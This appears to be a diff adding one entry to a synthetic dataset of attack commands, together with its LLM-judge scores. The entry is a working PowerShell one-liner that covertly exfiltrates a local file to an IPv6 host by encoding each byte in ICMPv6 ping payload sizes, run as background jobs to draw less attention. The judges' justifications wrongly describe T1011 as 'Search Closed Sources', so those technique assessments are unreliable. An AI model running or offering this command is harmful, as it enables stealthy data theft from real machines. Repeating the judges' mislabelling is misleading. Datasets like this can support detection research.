@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$d='fe80::2%14'; [IO.File]::ReadAllBytes('C:\\Users\\Public\\report.bin') | ForEach-Object { Test-Connection -ComputerName $d -Count 1 -BufferSize (512 + $_) -IPv6 -Quiet -AsJob | Out-Null }",
+  "explanation": "Backgrounds ICMPv6 transmissions that encode bytes in payload size, reducing interactive artifacts while exfiltrating over ICMPv6 consistent with T1011.",
+  "rationale_steps": [
+    "Read file bytes.",
+    "Offset and embed each byte in ICMPv6 payload size.",
+    "Run pings as background jobs to minimize console output and attention."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f38205c7-131755df",
+  "source_prompt_hash": "f38205c7",
+  "timestamp_utc": "2025-09-30T08:38:57.416507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper variable assignment, valid PowerShell cmdlets and parameters, and correct pipeline structure.",
+        "semantic_score": 2,
+        "semantic_justification": "The command attempts data exfiltration via ICMPv6 packet size manipulation but is misaligned with T1011 (Search Closed Sources) as it describes an exfiltration technique (more aligned with T1048) rather than gathering intelligence from non-public information sources.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T12:36:22.107058Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, uses correct PowerShell syntax for variable assignment, method calls, pipelines, cmdlets, and their parameters.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command accurately describes a plausible ICMPv6 exfiltration mechanism, the activity described (exfiltrating a local file) is semantically misaligned with MITRE ATT&CK T1011 'Search Closed Sources,' which focuses on acquiring information from external sources.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T12:36:36.977383Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is well-formed with correct quoting, separators, and valid parameter usage and will parse.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs ICMPv6-based exfiltration by encoding bytes in payload size, which is not aligned with the provided T1011 description of 'Search Closed Sources' (a reconnaissance activity), and may also suffer from -AsJob/-Quiet parameter set conflicts.",
+        "combined_score": 3.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T12:37:30.298569Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.667,
+    "llm_average_score": 3.333,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
